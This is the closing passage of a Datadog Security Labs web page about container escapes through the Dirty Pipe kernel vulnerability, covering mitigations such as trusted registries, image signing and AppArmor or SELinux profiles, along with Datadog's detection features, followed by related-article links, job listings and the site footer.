<p>To reduce the likelihood of this happening, the best practice is to ensure that only images from container registries you trust can be run in the cluster. This is typically implemented through a validating admission controller such as <a href="https://kyverno.io/policies/best-practices/restrict_image_registries/restrict_image_registries/">Kyverno</a> or <a href="https://github.com/open-policy-agent/gatekeeper">OPA Gatekeeper</a>.</p>
<p>If your container registry supports image signing, you can also use an admission controller to verify the provenance of your images and ensure they have been signed with a specific private key as part of your standard build process. See for instance: <a href="https://github.blog/2021-12-06-safeguard-container-signing-capability-actions/">Signing container images in the GitHub Container Registry</a> or <a href="https://cloud.google.com/binary-authorization">GCP Binary Authorization</a>.</p>
<h3 id="leverage-apparmor-or-selinux-to-prevent-potential-privilege-escalation-vectors" tabindex="-1"><a class="header-anchor" href="https://securitylabs.datadoghq.com/articles/dirty-pipe-container-escape-poc/#leverage-apparmor-or-selinux-to-prevent-potential-privilege-escalation-vectors">Leverage AppArmor or SELinux to prevent potential privilege escalation vectors</a></h3>
<p>Using AppArmor or SELinux to limit file system, kernel, and network activity that containerized applications can perform is a powerful way of preventing common privilege escalation vectors. AppArmor is generally considered easier to get started with, using tooling like <a href="https://github.com/genuinetools/bane">bane</a> to generate profiles and <a href="https://github.com/kubernetes-sigs/security-profiles-operator">security-profiles-operator</a> to easily deploy them on worker nodes.</p>
<h2 id="how-datadog-can-help" tabindex="-1"><a class="header-anchor" href="https://securitylabs.datadoghq.com/articles/dirty-pipe-container-escape-poc/#how-datadog-can-help">How Datadog Can Help</a></h2>
<p>Datadog <a href="https://www.datadoghq.com/product/security-platform/cloud-workload-security/">Cloud Workload Security</a> leverages real-time detections based on eBPF to identify common privilege escalation methods in virtual machines and containers. In particular, as of version 7.35, the Datadog Agent is able to detect Dirty Pipe exploitation in real time.</p>
<figure class="mt-4">
        <img class="w-full mx-auto" srcset="https://datadog-securitylabs.imgix.net/img/dirty-pipe-container-escape-poc/dirty-pipe-detection-datadog.png?auto=format&amp;w=896&amp;dpr=1 1x, https://datadog-securitylabs.imgix.net/img/dirty-pipe-container-escape-poc/dirty-pipe-detection-datadog.png?auto=format&amp;w=896&amp;dpr=2&amp;q=50 2x, https://datadog-securitylabs.imgix.net/img/dirty-pipe-container-escape-poc/dirty-pipe-detection-datadog.png?auto=format&amp;w=896&amp;dpr=3&amp;q=40 3x" src="./Escaping containers using the Dirty Pipe vulnerability _ Datadog Security Labs_files/dirty-pipe-detection-datadog.png" alt="Detecting Dirty Pipe with Datadog" loading="lazy">
        <figcaption class="text-gray-500 mt-4 mx-auto w-max max-w-full">Detecting Dirty Pipe with Datadog</figcaption>
      </figure>
<p>Datadog's <a href="https://docs.datadoghq.com/integrations/gatekeeper/">Gatekeeper integration</a> allows you to identify potentially risky Kubernetes workloads from a centralized location.</p>
<figure class="mt-4">
        <img class="w-full mx-auto" srcset="https://datadog-securitylabs.imgix.net/img/dirty-pipe-container-escape-poc/dirty-pipe-gatekeeper-dashboard.png?auto=format&amp;w=896&amp;dpr=1 1x, https://datadog-securitylabs.imgix.net/img/dirty-pipe-container-escape-poc/dirty-pipe-gatekeeper-dashboard.png?auto=format&amp;w=896&amp;dpr=2&amp;q=50 2x, https://datadog-securitylabs.imgix.net/img/dirty-pipe-container-escape-poc/dirty-pipe-gatekeeper-dashboard.png?auto=format&amp;w=896&amp;dpr=3&amp;q=40 3x" src="./Escaping containers using the Dirty Pipe vulnerability _ Datadog Security Labs_files/dirty-pipe-gatekeeper-dashboard.png" alt="Datadog&#39;s Gatekeeper dashboard" loading="lazy">
        <figcaption class="text-gray-500 mt-4 mx-auto w-max max-w-full">Datadog's Gatekeeper dashboard</figcaption>
      </figure>
<p>Datadog <a href="https://www.datadoghq.com/product/security-platform/cloud-siem/">Cloud SIEM</a> leverages audit logs from the Kubernetes API server to identify when <a href="https://docs.datadoghq.com/security_platform/default_rules/kubernetes-user-exec-to-pod/">someone uses <code>kubectl exec</code> against a running container</a>, which might be used as a vector to trigger a container escape.</p>
<h2 id="conclusion" tabindex="-1"><a class="header-anchor" href="https://securitylabs.datadoghq.com/articles/dirty-pipe-container-escape-poc/#conclusion">Conclusion</a></h2>
<p>Similar to the infamous <a href="https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/">CVE-2019-5736</a>, the Dirty Pipe vulnerability can be exploited with minimal user interaction to achieve a breakout from an unprivileged container. For more information about the vulnerability, including how to use Datadog to detect whether it is being exploited within your systems, refer to <a href="https://securitylabs.datadoghq.com/articles/dirty-pipe-vulnerability-overview-and-remediation/">The Dirty Pipe Vulnerability: Overview, Detection, and Remediation</a>.</p>

        <span class="block pb-6 tablet:pb-8 desktop:pb-12"></span>
      </div>

      <div>
        <div class="share-article">
  <ul class="flex gap-3 desktop:gap-4">
    
      
      
      
      
      <li class="inline-flex">
        <a href="https://twitter.com/share?url=https%3A%2F%2Fsecuritylabs.datadoghq.com%2Farticles%2Fdirty-pipe-container-escape-poc%2F&amp;text=Escaping%20containers%20using%20the%20Dirty%20Pipe%20vulnerability" title="twitter" data-custom-name="Social link">
          <svg class="fill-blue-1 hover:fill-blue-2 active:fill-blue-1" width="40" height="40" viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
<circle cx="20" cy="20" r="20"></circle>
<g clip-path="url(#clip0_37_5902)">
<path d="M32.9092 13.3016C32.01 13.693 31.0567 13.9458 30.0817 14.0513C31.1112 13.4379 31.8818 12.4703 32.2492 11.3299C31.2957 11.9088 30.2509 12.322 29.1592 12.5519C28.486 11.8187 27.6064 11.3066 26.6363 11.083C25.6662 10.8594 24.6511 10.9347 23.7247 11.2991C22.7983 11.6636 22.004 12.2999 21.4465 13.1245C20.8891 13.949 20.5945 14.9229 20.6017 15.9181C20.6016 16.2966 20.6444 16.6738 20.7292 17.0427C18.7718 16.9435 16.8571 16.4344 15.109 15.5484C13.361 14.6625 11.8185 13.4194 10.5817 11.8996C10.142 12.6499 9.91154 13.5042 9.91418 14.3737C9.90958 15.1884 10.1072 15.9916 10.4894 16.7112C10.8716 17.4309 11.4265 18.0445 12.1042 18.4971C11.3153 18.4784 10.5429 18.2674 9.85418 17.8823V17.9423C9.85385 19.0784 10.2464 20.1797 10.9654 21.0596C11.6843 21.9395 12.6855 22.5439 13.7992 22.7705C13.3763 22.8854 12.9399 22.9433 12.5017 22.9429C12.192 22.9434 11.883 22.9133 11.5792 22.8529C11.8923 23.8314 12.5041 24.6872 13.3287 25.3003C14.1532 25.9135 15.1492 26.2531 16.1767 26.2716C14.4307 27.64 12.2753 28.3819 10.0567 28.3783C9.67264 28.3676 9.28951 28.3351 8.90918 28.2808C11.1581 29.7303 13.7784 30.4983 16.4542 30.4925C25.5142 30.4925 30.4642 22.9954 30.4642 16.4879C30.4642 16.278 30.4642 16.0605 30.4642 15.8506C31.4253 15.1541 32.2534 14.2907 32.9092 13.3016Z" fill="white"></path>
</g>
<defs>
<clippath id="clip0_37_5902">
<rect width="24" height="19.5" fill="white" transform="translate(10 11)"></rect>
</clippath>
</defs>
</svg>

          <span class="sr-only">twitter</span>
        </a>
      </li>
    
      
      
      
      
      <li class="inline-flex">
        <a href="https://www.reddit.com/submit?url=https%3A%2F%2Fsecuritylabs.datadoghq.com%2Farticles%2Fdirty-pipe-container-escape-poc%2F" title="reddit" data-custom-name="Social link">
          <svg class="fill-orange-3 hover:fill-orange-4 active:fill-orange-3" width="40" height="40" viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M20 40C31.0457 40 40 31.0457 40 20C40 8.95431 31.0457 0 20 0C8.95431 0 0 8.95431 0 20C0 31.0457 8.95431 40 20 40Z"></path>
<path d="M33.3304 20.0001C33.3318 19.4272 33.1645 18.8666 32.8493 18.3882C32.5341 17.9099 32.085 17.5349 31.558 17.3103C31.031 17.0856 30.4495 17.0211 29.8861 17.1249C29.3227 17.2287 28.8024 17.4961 28.39 17.8938C26.3985 16.4569 23.651 15.5278 20.5899 15.4202L21.9192 9.16929L26.2604 10.0914C26.2837 10.5985 26.4911 11.0797 26.8438 11.4447C27.1966 11.8098 27.6703 12.0336 28.1764 12.0743C28.6824 12.115 29.1858 11.9697 29.5923 11.6656C29.9988 11.3616 30.2805 10.9197 30.3844 10.4228C30.4883 9.92592 30.4075 9.40819 30.1569 8.96669C29.9064 8.52519 29.5034 8.19025 29.0235 8.02468C28.5436 7.85911 28.0199 7.87427 27.5504 8.06733C27.0809 8.26039 26.6979 8.61809 26.4734 9.07334L21.6267 8.04128C21.4914 8.01286 21.3503 8.03928 21.2345 8.11475C21.1186 8.19022 21.0375 8.30856 21.0088 8.44381L19.5251 15.4178C16.4195 15.5044 13.6299 16.4358 11.6103 17.8892C11.3036 17.5961 10.9366 17.3735 10.5349 17.2369C10.1332 17.1004 9.70661 17.0533 9.28482 17.0987C8.86303 17.1442 8.45627 17.2813 8.09295 17.5003C7.72963 17.7193 7.41853 18.0151 7.18137 18.3668C6.94422 18.7186 6.78674 19.1179 6.71994 19.5368C6.65314 19.9557 6.67863 20.3842 6.79463 20.7923C6.91063 21.2003 7.11434 21.5782 7.39153 21.8993C7.66871 22.2205 8.01268 22.4772 8.39941 22.6516C8.35065 22.9425 8.32406 23.2367 8.31984 23.5316C8.31984 28.0202 13.5433 31.657 19.9885 31.657C26.4336 31.657 31.6547 28.0202 31.6547 23.5316C31.6545 23.2385 31.6318 22.9459 31.5869 22.6563C32.1032 22.4296 32.5427 22.058 32.8522 21.5865C33.1616 21.1151 33.3277 20.564 33.3304 20.0001ZM13.3327 22.0829C13.3322 21.6704 13.4542 21.267 13.683 20.9238C13.9118 20.5806 14.2373 20.313 14.6183 20.1548C14.9993 19.9966 15.4186 19.955 15.8233 20.0352C16.2279 20.1154 16.5997 20.3138 16.8915 20.6053C17.1834 20.8968 17.3822 21.2684 17.4628 21.6729C17.5435 22.0775 17.5023 22.4969 17.3446 22.878C17.1868 23.2592 16.9196 23.585 16.5766 23.8142C16.2337 24.0434 15.8304 24.1658 15.4179 24.1658C14.8655 24.1652 14.3358 23.9456 13.945 23.5552C13.5541 23.1648 13.3339 22.6354 13.3327 22.0829ZM24.9498 27.5896C23.5293 29.0078 20.8029 29.1201 20.0025 29.1201C19.2021 29.1201 16.4757 29.0078 15.0552 27.5896C14.9537 27.4881 14.8967 27.3505 14.8967 27.207C14.8967 27.0635 14.9537 26.9258 15.0552 26.8243C15.1566 26.7229 15.2943 26.6658 15.4378 26.6658C15.5813 26.6658 15.7189 26.7229 15.8204 26.8243C16.7168 27.7207 18.6288 28.0389 20.0025 28.0389C21.3762 28.0389 23.2906 27.7207 24.1869 26.8243C24.2365 26.7714 24.2963 26.7291 24.3626 26.6998C24.4289 26.6704 24.5005 26.6548 24.573 26.6537C24.6455 26.6526 24.7175 26.666 24.7847 26.6933C24.8518 26.7206 24.9128 26.7612 24.964 26.8125C25.0152 26.8639 25.0556 26.925 25.0827 26.9923C25.1098 27.0595 25.123 27.1316 25.1217 27.2041C25.1204 27.2766 25.1045 27.3481 25.075 27.4143C25.0454 27.4805 25.0029 27.5402 24.9498 27.5896ZM24.5848 24.1681C24.1722 24.1686 23.7687 24.0466 23.4254 23.8177C23.0821 23.5887 22.8145 23.2631 22.6564 22.882C22.4983 22.5009 22.4568 22.0814 22.5372 21.6767C22.6176 21.272 22.8162 20.9002 23.108 20.6085C23.3997 20.3167 23.7715 20.1181 24.1762 20.0377C24.5809 19.9573 25.0004 19.9988 25.3815 20.1569C25.7626 20.315 26.0882 20.5827 26.3172 20.9259C26.5461 21.2692 26.6681 21.6727 26.6676 22.0853C26.6664 22.6373 26.4465 23.1664 26.0562 23.5567C25.6658 23.947 25.1368 24.1669 24.5848 24.1681Z" fill="white"></path>
</svg>

          <span class="sr-only">reddit</span>
        </a>
      </li>
    
  </ul>
</div>
      </div>
    </div>
  </article>

  <span class="block pb-16 tablet:pb-24 desktop:pb-30"></span>

  
  

  
    <section>
      <h2 class="h1">Related Content</h2>

      <span class="block pb-4 tablet:pb-5 desktop:pb-6"></span>

      <div class="grid grid-cols-1 tablet:grid-cols-3 gap-6 tablet:gap-[30px]">
        
          
            <a class="block text-black" href="https://securitylabs.datadoghq.com/articles/confluence-rce-vulnerability-overview-and-remediation/">
  <article>
    
    


    



<figure>
    <img srcset="https://datadog-securitylabs.imgix.net/img/emergingvuln_hero_cloud.png?auto=format&amp;w=428&amp;dpr=1 1x,
                    https://datadog-securitylabs.imgix.net/img/emergingvuln_hero_cloud.png?auto=format&amp;w=428&amp;dpr=2&amp;q=50 2x,
                    https://datadog-securitylabs.imgix.net/img/emergingvuln_hero_cloud.png?auto=format&amp;w=428&amp;dpr=3&amp;q=40 3x" src="./Escaping containers using the Dirty Pipe vulnerability _ Datadog Security Labs_files/emergingvuln_hero_cloud.png" alt="The Confluence RCE vulnerability (CVE-2022-26134): Overview, detection, and remediation" class="">
</figure>



    <span class="block pb-2 tablet:pb-3 desktop:pb-4"></span>

    <p class="text-12 leading-16 tablet:text-14 tablet:leading-18 font-roboto-mono font-light uppercase tracking-4">emerging vulnerabilities</p>

    <span class="block pb-0.5 tablet:pb-1 desktop:pb-2"></span>

    <p class="text-16 leading-20 tablet:text-18 tablet:leading-24 desktop:text-20 desktop:leading-24 font-extrabold tracking-1 hover:text-purple active:text-purple-3">The Confluence RCE vulnerability (CVE-2022-26134): Overview, detection, and remediation</p>
  </article>
</a>
          
        
          
            <a class="block text-black" href="https://securitylabs.datadoghq.com/articles/confluence-vulnerability-cve-2023-22515-overview-and-remediation/">
  <article>
    
    


    



<figure>
    <img srcset="https://datadog-securitylabs.imgix.net/img/emergingvuln_hero_explode.png?auto=format&amp;w=428&amp;dpr=1 1x,
                    https://datadog-securitylabs.imgix.net/img/emergingvuln_hero_explode.png?auto=format&amp;w=428&amp;dpr=2&amp;q=50 2x,
                    https://datadog-securitylabs.imgix.net/img/emergingvuln_hero_explode.png?auto=format&amp;w=428&amp;dpr=3&amp;q=40 3x" src="./Escaping containers using the Dirty Pipe vulnerability _ Datadog Security Labs_files/emergingvuln_hero_explode(1).png" alt="The Confluence CVE-2023-22515 vulnerability: Overview, detection, and remediation" class="">
</figure>



    <span class="block pb-2 tablet:pb-3 desktop:pb-4"></span>

    <p class="text-12 leading-16 tablet:text-14 tablet:leading-18 font-roboto-mono font-light uppercase tracking-4">emerging vulnerabilities</p>

    <span class="block pb-0.5 tablet:pb-1 desktop:pb-2"></span>

    <p class="text-16 leading-20 tablet:text-18 tablet:leading-24 desktop:text-20 desktop:leading-24 font-extrabold tracking-1 hover:text-purple active:text-purple-3">The Confluence CVE-2023-22515 vulnerability: Overview, detection, and remediation</p>
  </article>
</a>
          
        
          
        
          
            <a class="block text-black" href="https://securitylabs.datadoghq.com/articles/dirty-pipe-vulnerability-overview-and-remediation/">
  <article>
    
    


    



<figure>
    <img srcset="https://datadog-securitylabs.imgix.net/img/emergingvuln_hero_cloud.png?auto=format&amp;w=428&amp;dpr=1 1x,
                    https://datadog-securitylabs.imgix.net/img/emergingvuln_hero_cloud.png?auto=format&amp;w=428&amp;dpr=2&amp;q=50 2x,
                    https://datadog-securitylabs.imgix.net/img/emergingvuln_hero_cloud.png?auto=format&amp;w=428&amp;dpr=3&amp;q=40 3x" src="./Escaping containers using the Dirty Pipe vulnerability _ Datadog Security Labs_files/emergingvuln_hero_cloud.png" alt="The Dirty Pipe vulnerability: Overview, detection, and remediation" class="">
</figure>



    <span class="block pb-2 tablet:pb-3 desktop:pb-4"></span>

    <p class="text-12 leading-16 tablet:text-14 tablet:leading-18 font-roboto-mono font-light uppercase tracking-4">emerging vulnerabilities</p>

    <span class="block pb-0.5 tablet:pb-1 desktop:pb-2"></span>

    <p class="text-16 leading-20 tablet:text-18 tablet:leading-24 desktop:text-20 desktop:leading-24 font-extrabold tracking-1 hover:text-purple active:text-purple-3">The Dirty Pipe vulnerability: Overview, detection, and remediation</p>
  </article>
</a>
          
        
          
        
          
        
          
        
          
        
          
        
          
        
      </div>
    </section>
  
</div>

<div class="border-t border-gray-800"></div>
<section id="work-with-us">
  <div class="work-with-us container desktop:py-15 tablet:py-12 py-9">
    <h2 class="h1 capitalize">work with us</h2>

    <span class="block pb-2 tablet:pb-3 desktop:pb-4"></span>

    <p class="desktop:text-28 desktop:leading-32 tablet:text-24 tablet:leading-28 text-20 leading-24">
      We're always looking for talented people to collaborate with
    </p>

    <span class="block pb-6 tablet:pb-8 desktop:pb-12"></span>

    <div>
      <p class="font-extrabold desktop:text-16 desktop:leading-20 text-14 leading-18 uppercase">
        featured positions
      </p>

      <span class="block pb-2 desktop:pb-3"></span>

      <ul class="border-t border-gray-15">
        
          
            <li>
              <a class="block border-b border-gray-15 py-2 tablet:py-3 desktop:py-4 hover:bg-purple-1 active:text-purple-3" href="https://careers.datadoghq.com/detail/5250434/?gh_jid=5250434">
                <article class="flex tablet:flex-row tablet:justify-between tablet:items-center flex-col">
                  <p class="font-extrabold desktop:text-20 desktop:leading-28 tablet:text-18 tablet:leading-24 text-16 leading-20">
                    Staff Security Engineer - Remote Configuration
                  </p>
                  <p class="font-roboto-mono font-light desktop:text-16 desktop:leading-20 tablet:text-14 tablet:leading-18 text-12 leading-16 uppercase tracking-10">
                    Security - Engineering
                  </p>
                </article>
              </a>
            </li>
          
        
          
            <li>
              <a class="block border-b border-gray-15 py-2 tablet:py-3 desktop:py-4 hover:bg-purple-1 active:text-purple-3" href="https://careers.datadoghq.com/detail/5306189/?gh_jid=5306189">
                <article class="flex tablet:flex-row tablet:justify-between tablet:items-center flex-col">
                  <p class="font-extrabold desktop:text-20 desktop:leading-28 tablet:text-18 tablet:leading-24 text-16 leading-20">
                    Detection Engineer 2 - Cloud SIEM
                  </p>
                  <p class="font-roboto-mono font-light desktop:text-16 desktop:leading-20 tablet:text-14 tablet:leading-18 text-12 leading-16 uppercase tracking-10">
                    Security - Engineering
                  </p>
                </article>
              </a>
            </li>
          
        
          
            <li>
              <a class="block border-b border-gray-15 py-2 tablet:py-3 desktop:py-4 hover:bg-purple-1 active:text-purple-3" href="https://careers.datadoghq.com/detail/5580608/?gh_jid=5580608">
                <article class="flex tablet:flex-row tablet:justify-between tablet:items-center flex-col">
                  <p class="font-extrabold desktop:text-20 desktop:leading-28 tablet:text-18 tablet:leading-24 text-16 leading-20">
                    Detection Engineer 2 - Cloud SIEM - NorAm
                  </p>
                  <p class="font-roboto-mono font-light desktop:text-16 desktop:leading-20 tablet:text-14 tablet:leading-18 text-12 leading-16 uppercase tracking-10">
                    Security - Engineering
                  </p>
                </article>
              </a>
            </li>
          
        
          
            <li>
              <a class="block border-b border-gray-15 py-2 tablet:py-3 desktop:py-4 hover:bg-purple-1 active:text-purple-3" href="https://careers.datadoghq.com/detail/5289945/?gh_jid=5289945">
                <article class="flex tablet:flex-row tablet:justify-between tablet:items-center flex-col">
                  <p class="font-extrabold desktop:text-20 desktop:leading-28 tablet:text-18 tablet:leading-24 text-16 leading-20">
                    Detection Engineer 2 - CSM
                  </p>
                  <p class="font-roboto-mono font-light desktop:text-16 desktop:leading-20 tablet:text-14 tablet:leading-18 text-12 leading-16 uppercase tracking-10">
                    Security - Engineering
                  </p>
                </article>
              </a>
            </li>
          
        
          
            <li>
              <a class="block border-b border-gray-15 py-2 tablet:py-3 desktop:py-4 hover:bg-purple-1 active:text-purple-3" href="https://careers.datadoghq.com/detail/5480728/?gh_jid=5480728">
                <article class="flex tablet:flex-row tablet:justify-between tablet:items-center flex-col">
                  <p class="font-extrabold desktop:text-20 desktop:leading-28 tablet:text-18 tablet:leading-24 text-16 leading-20">
                    Director, Security Engineering
                  </p>
                  <p class="font-roboto-mono font-light desktop:text-16 desktop:leading-20 tablet:text-14 tablet:leading-18 text-12 leading-16 uppercase tracking-10">
                    Security - Engineering
                  </p>
                </article>
              </a>
            </li>
          
        
          
            <li>
              <a class="block border-b border-gray-15 py-2 tablet:py-3 desktop:py-4 hover:bg-purple-1 active:text-purple-3" href="https://careers.datadoghq.com/detail/5080553/?gh_jid=5080553">
                <article class="flex tablet:flex-row tablet:justify-between tablet:items-center flex-col">
                  <p class="font-extrabold desktop:text-20 desktop:leading-28 tablet:text-18 tablet:leading-24 text-16 leading-20">
                    Engineering Manager I, Core Security Response
                  </p>
                  <p class="font-roboto-mono font-light desktop:text-16 desktop:leading-20 tablet:text-14 tablet:leading-18 text-12 leading-16 uppercase tracking-10">
                    Security - Engineering
                  </p>
                </article>
              </a>
            </li>
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
      </ul>
    </div>

    <span class="block pb-6 tablet:pb-8 desktop:pb-12"></span>

    <p class="desktop:text-28 desktop:leading-32 tablet:text-24 tablet:leading-28 text-20 leading-24">
      We have <span class="text-purple-3">15</span> positions
    </p>

    <span class="block pb-4 tablet:pb-5 desktop:pb-6"></span>

    
 <a href="https://careers.datadoghq.com/all-jobs/?parent_department_Engineering%5B0%5D=Engineering&amp;child_department_Engineering%5B0%5D=Global%20Information%20Security" role="link" data-custom-name="View all positions button">
  <button class="btn-default border-default" type="button">view all</button>
</a>

  </div>
</section>

<script src="./Escaping containers using the Dirty Pipe vulnerability _ Datadog Security Labs_files/article-LWR6NIYI.js" defer=""></script>
<script type="module" async="">import mermaid from "https://unpkg.com/mermaid@10/dist/mermaid.esm.min.mjs";document.addEventListener('DOMContentLoaded', mermaid.initialize({startOnLoad:true}));</script>

    </main>
    
    

<footer class="navbar navbar-footer">
  <div class="container h-full flex tablet:flex-nowrap flex-wrap justify-between tablet:items-center">
    <p class="copyright tablet:-order-none order-2">© Datadog 2023</p>
    <nav class="navbar-menu tablet:order-none order-1 tablet:w-auto w-full tablet:m-0 mb-5">
      <ul>
        
          <li class="navbar-menu-item navbar-menu-item-footer ">
  <a href="https://www.datadoghq.com/legal/terms/" title="TERMS" class="navbar-menu-link" data-custom-name="Footer link">
    <span class="">TERMS</span>
    
  </a>
</li>
        
          <li class="navbar-menu-item navbar-menu-item-footer ">
  <a href="https://www.datadoghq.com/legal/privacy/" title="PRIVACY" class="navbar-menu-link" data-custom-name="Footer link">
    <span class="">PRIVACY</span>
    
  </a>
</li>
        
          <li class="navbar-menu-item navbar-menu-item-footer ">
  <a href="https://www.datadoghq.com/legal/cookies/" title="COOKIES" class="navbar-menu-link" data-custom-name="Footer link">
    <span class="">COOKIES</span>
    
  </a>
</li>
        
      </ul>
    </nav>
    <nav class="navbar-menu tablet:order-none order-3">
      <ul class="flex items-center gap-5">
        
          <li class="navbar-menu-item navbar-menu-item-social fill-white hover:fill-purple active:fill-purple-3 ">
  <a href="https://www.twitter.com/datadoghq/" title="twitter" class="navbar-menu-link" data-custom-name="Social link">
    <span class="sr-only">twitter</span>
    
      <svg class="navbar-menu-item-social fill-white hover:fill-purple active:fill-purple-3" width="32" height="26" viewBox="0 0 32 26" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M32 3.06847C30.8011 3.59032 29.53 3.92736 28.23 4.06809C29.6028 3.25017 30.6302 1.96012 31.12 0.439486C29.8487 1.21147 28.4556 1.7624 27 2.06886C26.1024 1.09132 24.9296 0.408504 23.6362 0.11034C22.3427 -0.187824 20.9892 -0.0873454 19.754 0.398541C18.5188 0.884427 17.4598 1.73293 16.7165 2.83228C15.9732 3.93163 15.5804 5.23027 15.59 6.55713C15.5899 7.06175 15.6469 7.56476 15.76 8.05656C13.1501 7.92429 10.5972 7.24554 8.26644 6.06426C5.9357 4.88298 3.87916 3.22551 2.23 1.19919C1.64381 2.19953 1.33648 3.33861 1.34 4.49792C1.33386 5.58425 1.5974 6.65514 2.10701 7.61464C2.61661 8.57415 3.35637 9.3923 4.26 9.99581C3.20814 9.97087 2.1783 9.68949 1.26 9.17613V9.25609C1.25956 10.7709 1.78297 12.2393 2.74158 13.4125C3.70019 14.5857 5.03504 15.3916 6.52 15.6936C5.95613 15.8468 5.37433 15.9241 4.79 15.9235C4.37705 15.9242 3.96504 15.884 3.56 15.8036C3.97753 17.1081 4.79325 18.2493 5.89266 19.0668C6.99208 19.8843 8.31998 20.3372 9.69 20.3618C7.36206 22.1863 4.48815 23.1756 1.53 23.1707C1.01794 23.1565 0.507113 23.1132 0 23.0408C2.9985 24.9733 6.49229 25.9975 10.06 25.9897C22.14 25.9897 28.74 15.9935 28.74 7.31684C28.74 7.03695 28.74 6.74706 28.74 6.46717C30.0214 5.53848 31.1256 4.38732 32 3.06847Z"></path>
</svg>

    
  </a>
</li>
        
          <li class="navbar-menu-item navbar-menu-item-social fill-white hover:fill-purple active:fill-purple-3 ">
  <a href="https://securitylabs.datadoghq.com/rss/feed.xml" title="rss" class="navbar-menu-link" data-custom-name="Social link">
    <span class="sr-only">rss</span>
    
      <svg class="navbar-menu-item-social fill-white hover:fill-purple active:fill-purple-3" version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 192 192" style="enable-background:new 0 0 192 192;" xml:space="preserve">
  <path class="st0" d="M136,154h-16c0-45.21-36.79-82-82-82V56C92.04,56,136,99.96,136,154z"></path>
  <path class="st0" d="M96,154H80c0-23.16-18.84-42-42-42V96C69.98,96,96,122.02,96,154z"></path>
  <path class="st0" d="M176,154h-16c0-67.27-54.73-122-122-122V16C114.09,16,176,77.91,176,154z"></path>
  <circle class="st0" cx="38" cy="154" r="18"></circle>
</svg>

    
  </a>
</li>
        
      </ul>
    </nav>
  </div>
</footer><div id="goog-gt-tt" class="VIpgJd-yAWNEb-L7lbkb skiptranslate" style="border-radius: 12px; margin: 0 0 0 -23px; padding: 0; font-family: &#39;Google Sans&#39;, Arial, sans-serif;" data-id=""><div id="goog-gt-vt" class="VIpgJd-yAWNEb-hvhgNd"><div class=" VIpgJd-yAWNEb-hvhgNd-l4eHX-i3jM8c"><img src="./Escaping containers using the Dirty Pipe vulnerability _ Datadog Security Labs_files/24px.svg" width="24" height="24" alt=""></div><div class=" VIpgJd-yAWNEb-hvhgNd-k77Iif-i3jM8c"><div class="VIpgJd-yAWNEb-hvhgNd-IuizWc" dir="ltr">原文</div><div id="goog-gt-original-text" class="VIpgJd-yAWNEb-nVMfcd-fmcmS VIpgJd-yAWNEb-hvhgNd-axAV1"></div></div><div class="VIpgJd-yAWNEb-hvhgNd-N7Eqid ltr"><div class="VIpgJd-yAWNEb-hvhgNd-N7Eqid-B7I4Od ltr" dir="ltr"><div class="VIpgJd-yAWNEb-hvhgNd-UTujCb">请对此翻译评分</div><div class="VIpgJd-yAWNEb-hvhgNd-eO9mKe">您的反馈将用于改进谷歌翻译</div></div><div class="VIpgJd-yAWNEb-hvhgNd-xgov5 ltr"><button id="goog-gt-thumbUpButton" type="button" class="VIpgJd-yAWNEb-hvhgNd-bgm6sf" title="翻译质量很棒" aria-label="翻译质量很棒" aria-pressed="false"><span id="goog-gt-thumbUpIcon"><svg width="24" height="24" viewBox="0 0 24 24" focusable="false" class="VIpgJd-yAWNEb-hvhgNd-THI6Vb NMm5M"><path d="M21 7h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 0S7.08 6.85 7 7H2v13h16c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73V9c0-1.1-.9-2-2-2zM7 18H4V9h3v9zm14-7l-3 7H9V8l4.34-4.34L12 9h9v2z"></path></svg></span><span id="goog-gt-thumbUpIconFilled"><svg width="24" height="24" viewBox="0 0 24 24" focusable="false" class="VIpgJd-yAWNEb-hvhgNd-THI6Vb NMm5M"><path d="M21 7h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 0S7.08 6.85 7 7v13h11c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73V9c0-1.1-.9-2-2-2zM5 7H1v13h4V7z"></path></svg></span></button><button id="goog-gt-thumbDownButton" type="button" class="VIpgJd-yAWNEb-hvhgNd-bgm6sf" title="翻译质量很差" aria-label="翻译质量很差" aria-pressed="false"><span id="goog-gt-thumbDownIcon"><svg width="24" height="24" viewBox="0 0 24 24" focusable="false" class="VIpgJd-yAWNEb-hvhgNd-THI6Vb NMm5M"><path d="M3 17h6.31l-.95 4.57-.03.32c0 .41.17.79.44 1.06L9.83 24s7.09-6.85 7.17-7h5V4H6c-.83 0-1.54.5-1.84 1.22l-3.02 7.05c-.09.23-.14.47-.14.73v2c0 1.1.9 2 2 2zM17 6h3v9h-3V6zM3 13l3-7h9v10l-4.34 4.34L12 15H3v-2z"></path></svg></span><span id="goog-gt-thumbDownIconFilled"><svg width="24" height="24" viewBox="0 0 24 24" focusable="false" class="VIpgJd-yAWNEb-hvhgNd-THI6Vb NMm5M"><path d="M3 17h6.31l-.95 4.57-.03.32c0 .41.17.79.44 1.06L9.83 24s7.09-6.85 7.17-7V4H6c-.83 0-1.54.5-1.84 1.22l-3.02 7.05c-.09.23-.14.47-.14.73v2c0 1.1.9 2 2 2zm16 0h4V4h-4v13z"></path></svg></span></button></div></div><div id="goog-gt-votingHiddenPane" class="VIpgJd-yAWNEb-hvhgNd-aXYTce"><form id="goog-gt-votingForm" action="https://translate.googleapis.com/translate_voting?client=te_lib" method="post" target="votingFrame" class="VIpgJd-yAWNEb-hvhgNd-aXYTce"><input type="text" name="sl" id="goog-gt-votingInputSrcLang"><input type="text" name="tl" id="goog-gt-votingInputTrgLang"><input type="text" name="query" id="goog-gt-votingInputSrcText"><input type="text" name="gtrans" id="goog-gt-votingInputTrgText"><input type="text" name="vote" id="goog-gt-votingInputVote"></form><iframe name="votingFrame" frameborder="0" src="./Escaping containers using the Dirty Pipe vulnerability _ Datadog Security Labs_files/saved_resource.html"></iframe></div></div></div>
  

</body></html>